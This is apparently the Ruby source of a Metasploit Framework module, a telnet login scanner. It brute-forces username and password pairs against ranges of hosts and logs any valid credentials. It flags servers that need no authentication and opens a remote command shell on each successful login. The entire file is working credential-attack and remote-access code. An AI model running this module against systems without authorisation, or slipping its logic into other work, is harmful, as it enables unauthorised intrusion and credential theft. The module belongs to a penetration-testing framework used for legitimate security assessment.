##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/base/sessions/command_shell_options'

#
# Ghetto
#
module CRLFLineEndings
	def put(str)
		return super if not str
		super(str.strip + "\r\n")
	end
end

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Telnet
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	include Msf::Sessions::CommandShellOptions

	def initialize
		super(
			'Name'        => 'Telnet Login Check Scanner',
			#'Version'     => '$Revision$',
			'Description' => %q{
				This module will test a telnet login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => 'egypt',
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST')
		register_advanced_options(
			[
				OptInt.new('TIMEOUT', [ true, 'Default timeout for telnet connections. The greatest value of TelnetTimeout, TelnetBannerTimeout, or this option will be used as an overall timeout.', 0])
			], self.class
		)

		@no_pass_prompt = []
	end

	attr_accessor :no_pass_prompt
	attr_accessor :password_only

	def run_host(ip)
		overall_timeout ||= [
			datastore['TIMEOUT'].to_i,
			datastore['TelnetBannerTimeout'].to_i,
			datastore['TelnetTimeout'].to_i
		].sort.last

		self.password_only = []

		if connect_reset_safe == :connected
			@strip_usernames = true if password_prompt?
			self.sock.close
		end

		begin
			each_user_pass do |user, pass|
				Timeout.timeout(overall_timeout) do
					try_user_pass(user, pass)
				end
			end
		rescue ::Rex::ConnectionError, ::EOFError, ::Timeout::Error
			return
		end
	end

	def try_user_pass(user, pass)
		vprint_status "#{rhost}:#{rport} Telnet - Attempting: '#{user}':'#{pass}'"
		ret = do_login(user,pass)
		case ret
		when :no_auth_required
			print_good "#{rhost}:#{rport} Telnet - No authentication required!"
			return :abort
		when :no_pass_prompt
			vprint_status "#{rhost}:#{rport} Telnet - Skipping '#{user}' due to missing password prompt"
			return :next_user
		when :timeout
			vprint_status "#{rhost}:#{rport} Telnet - Skipping '#{user}':'#{pass}' due to timeout"
		when :busy
			vprint_error "#{rhost}:#{rport} Telnet - Skipping '#{user}':'#{pass}' due to busy state"
		when :refused
			vprint_error "#{rhost}:#{rport} Telnet - Skipping '#{user}':'#{pass}' due to connection refused."
		else
			if login_succeeded?
				start_telnet_session(rhost,rport,user,pass)
				return :next_user
			end
		end
	end

	# Sometimes telnet servers start RSTing if you get them angry.
	# This is a short term fix; the problem is that we don't know
	# if it's going to reset forever, or just this time, or randomly.
	# A better solution is to get the socket connect to try again
	# with a little backoff.
	def connect_reset_safe
		begin
			connect
		rescue Rex::ConnectionRefused
			return :refused
		end
		return :connected
	end

	# Making this serial since the @attempts counting business is causing
	# all kinds of syncing problems.
	def do_login(user,pass)

		return :refused if connect_reset_safe == :refused

		begin

		vprint_status("#{rhost}:#{rport} Banner: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")

		if busy_message?
			self.sock.close unless self.sock.closed?
			return :busy
		end

		if login_succeeded?
			report_telnet('','',@trace)
			return :no_auth_required
		end

		# Immediate password prompt... try our password!
		if password_prompt?
			user = ''

			if password_only.include?(pass)
				print_status("#{rhost}:#{rport} - Telnet - skipping already tried password '#{pass}'")
				return :tried
			end

			print_status("#{rhost}:#{rport} - Telnet - trying password only authentication with password '#{pass}'")
			password_only << pass
		else
			send_user(user)
		end

		# Allow for slow echos
		1.upto(10) do
			recv_telnet(self.sock, 0.10)
		end

		vprint_status("#{rhost}:#{rport} Prompt: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")

		if password_prompt?
			send_pass(pass)

			# Allow for slow echos
			1.upto(10) do
				recv_telnet(self.sock, 0.10)
			end


			vprint_status("#{rhost}:#{rport} Result: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")

			if login_succeeded?
				report_telnet(user,pass,@trace)
				return :success
			else
				self.sock.close unless self.sock.closed?
				return :fail
			end
		else
			if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
				report_telnet(user,pass,@trace)
				return :no_pass_required
			else
				self.sock.close unless self.sock.closed?
				return :no_pass_prompt
			end
		end

		rescue ::Interrupt
			self.sock.close unless self.sock.closed?
			raise $!
		rescue ::Exception => e
			if e.to_s == "execution expired"
				self.sock.close unless self.sock.closed?
				return :timeout
			else
				self.sock.close unless self.sock.closed?
				print_error("#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}")
			end
		end

	end

	def report_telnet(user,pass,proof)
		print_good("#{rhost} - SUCCESSFUL LOGIN #{user} : #{pass}")
		report_auth_info(
			:host	=> rhost,
			:proto	=> 'telnet',
			:user	=> user,
			:pass	=> pass,
			:target_host	=> rhost,
			:target_port	=> datastore['RPORT'],
			:proof  => proof
		)
	end

	def start_telnet_session(host,port,user,pass)
		# Windows telnet server requires \r\n line endings and it doesn't
		# seem to affect anything else.
		sock.extend(CRLFLineEndings)
		sess = Msf::Sessions::CommandShell.new(sock)
		sess.set_from_exploit(self)
		sess.info = "TELNET #{user}:#{pass} (#{host}:#{port})"

		# Clean up the stored data
		sess.exploit_datastore['USERPASS_FILE'] = nil
		sess.exploit_datastore['USER_FILE']     = nil
		sess.exploit_datastore['PASS_FILE']     = nil
		sess.exploit_datastore['USERNAME']      = user
		sess.exploit_datastore['PASSWORD']      = pass

		framework.sessions.register(sess)
		sess.process_autoruns(datastore)
	end

end

